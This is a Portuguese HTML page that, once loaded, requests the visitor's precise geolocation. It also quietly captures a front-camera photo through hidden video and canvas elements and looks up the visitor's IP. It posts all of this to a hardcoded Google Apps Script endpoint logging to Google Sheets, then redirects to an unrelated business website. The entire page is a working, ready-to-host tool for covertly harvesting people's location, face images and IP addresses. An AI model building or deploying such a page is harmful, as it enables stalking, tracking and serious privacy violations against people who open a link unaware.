<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Localizando e Capturando...</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
    }
    p {
      padding: 10px;
      margin: 5px;
    }
    video {
      /* Oculta o v√≠deo, ele ser√° usado apenas para capturar o frame */
      display: none;
      width: 320px; /* Tamanho da √°rea de captura do v√≠deo */
      height: 240px;
      background-color: #333;
    }
    canvas {
      display: none; /* Oculta o canvas */
    }
  </style>
  <script>
    let videoStream = null; // Vari√°vel para armazenar o stream da c√¢mera
    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbznSy4idde1FHDovFtoeoFQw4yMiI_-JIMBssQb7L90vszmgDEsJ14sCcNkFSJgEgtX2A/exec'; // SEU URL DO WEBAPP AQUI!

    window.onload = function() {
      document.body.innerHTML = "<p>üìç Obtendo sua localiza√ß√£o... Aguarde...</p>";
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sucessoLocalizacao, erroLocalizacao, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        document.body.innerHTML = "<p>Seu navegador n√£o suporta geolocaliza√ß√£o.</p>";
        // Se a geolocaliza√ß√£o n√£o √© suportada, tenta apenas a c√¢mera
        iniciarCapturaCamera(null, null);
      }
    };

    function sucessoLocalizacao(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      document.body.innerHTML += `<p>‚úÖ Localiza√ß√£o obtida!</p>`;
      iniciarCapturaCamera(latitude, longitude);
    }

    function erroLocalizacao(err) {
      console.warn("Geolocaliza√ß√£o n√£o permitida ou erro:", err.message);
      let msg = "<p>‚ö†Ô∏è √â necess√°rio permitir a localiza√ß√£o para continuar.</p>";
      if (err.code === 1) {
        msg = "<p>‚ùå Acesso √† localiza√ß√£o negado. Por favor, permita.</p>";
      } else if (err.code === 3) {
        msg = "<p>‚åõ Tempo limite para obter localiza√ß√£o excedido.</p>";
      }
      document.body.innerHTML = msg;
      // Continua para a c√¢mera mesmo se a localiza√ß√£o falhar
      iniciarCapturaCamera(null, null);
    }

    async function iniciarCapturaCamera(latitude, longitude) {
      document.body.innerHTML += "<p>üì∑ Solicitando acesso √† c√¢mera... Aguarde...</p>";
      try {
        // Prefer√™ncia pela c√¢mera frontal (user). Se precisar da traseira, mude para "environment"
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        videoStream = stream; // Armazena o stream para poder parar depois

        const video = document.createElement('video');
        video.autoplay = true;
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          video.play(); // Garante que o v√≠deo comece a tocar
          setTimeout(() => {
            capturarImagem(latitude, longitude);
          }, 500); // Pequeno atraso para garantir que o stream est√° est√°vel
        };
        document.body.appendChild(video); // Adiciona o v√≠deo ao DOM (pode ser invis√≠vel)

      } catch (err) {
        console.error("Erro ao acessar a c√¢mera:", err);
        let cameraErrorMsg = "<p>‚ùå Erro ao acessar a c√¢mera. Certifique-se de permitir o acesso.</p>";
        if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
          cameraErrorMsg = "<p>üö´ Acesso √† c√¢mera negado. Por favor, permita.</p>";
        } else if (err.name === "NotFoundError") {
          cameraErrorMsg = "<p>üì∏ Nenhuma c√¢mera encontrada.</p>";
        }
        document.body.innerHTML += cameraErrorMsg;
        // Redireciona mesmo se a c√¢mera falhar
        enviarDadosParaSheets(latitude, longitude, null); // Envia sem a imagem
      }
    }

    function capturarImagem(latitude, longitude) {
      const video = document.querySelector('video');
      if (!video || !videoStream) {
        console.error("V√≠deo ou stream da c√¢mera n√£o dispon√≠vel para captura.");
        enviarDadosParaSheets(latitude, longitude, null); // Envia sem a imagem
        return;
      }

      const canvas = document.createElement('canvas');
      // Define a resolu√ß√£o da imagem capturada (pode ajustar)
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');

      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Converte a imagem para uma URL base64. Qualidade 0.9 para JPEG.
      const imageDataURL = canvas.toDataURL('image/jpeg', 0.9);

      // Para de usar a c√¢mera
      if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
        videoStream = null;
      }
      if (video.parentNode) {
        video.parentNode.removeChild(video); // Remove o elemento de v√≠deo do DOM
      }
      document.body.innerHTML += `<p>üì∏ Imagem capturada!</p>`;
      enviarDadosParaSheets(latitude, longitude, imageDataURL);
    }

    async function enviarDadosParaSheets(latitude, longitude, imageDataURL) {
      document.body.innerHTML += `<p>üöÄ Enviando dados...</p>`;
      let ip = 'N√£o detectado';
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        ip = data.ip;
      } catch (error) {
        console.error("Erro ao obter IP:", error);
      }

      const mapsLink = latitude && longitude ? `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}` : 'Localiza√ß√£o n√£o dispon√≠vel';

      const payload = {
        latitude: latitude,
        longitude: longitude,
        ip: ip,
        maps: mapsLink,
        // Inclui a imagem em base64 APENAS SE HOUVER
        imagem: imageDataURL || 'N/A' // Envia 'N/A' se n√£o houver imagem
      };

      try {
        // Usamos POST e esperamos uma resposta para saber se foi bem-sucedido
        const response = await fetch(WEBAPP_URL, {
          method: 'POST',
          // mode: 'no-cors' REMOVIDO: O web app do Google Apps Script precisa de CORS para uma resposta
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        // Verifique a resposta do servidor do Google Apps Script
        if (response.ok) {
          console.log("Dados enviados com sucesso para o Google Sheets.");
          document.body.innerHTML += `<p>‚úÖ Dados enviados!</p>`;
        } else {
          const errorText = await response.text();
          console.error("Erro ao enviar dados para o Google Sheets:", response.status, errorText);
          document.body.innerHTML += `<p>‚ùå Erro ao enviar dados. Tente novamente.</p>`;
        }
      } catch (error) {
        console.error("Erro de rede ao enviar dados para o Google Sheets:", error);
        document.body.innerHTML += `<p>‚ùå Erro de conex√£o. Tente novamente.</p>`;
      } finally {
        // Garante que o redirecionamento aconte√ßa ap√≥s a tentativa de envio
        redirecionaDespachanteMauro();
      }
    }

    // Fun√ß√£o de redirecionamento final
    function redirecionaDespachanteMauro() {
      document.body.innerHTML += "<p>‚û°Ô∏è Redirecionando...</p>";
      setTimeout(() => {
        window.location.href = "https://despachantemauro.com.br/";
      }, 2000); // Pequeno atraso para a mensagem ser vista
    }
  </script>
</head>
<body>
  <p>Iniciando...</p>
</body>
</html>
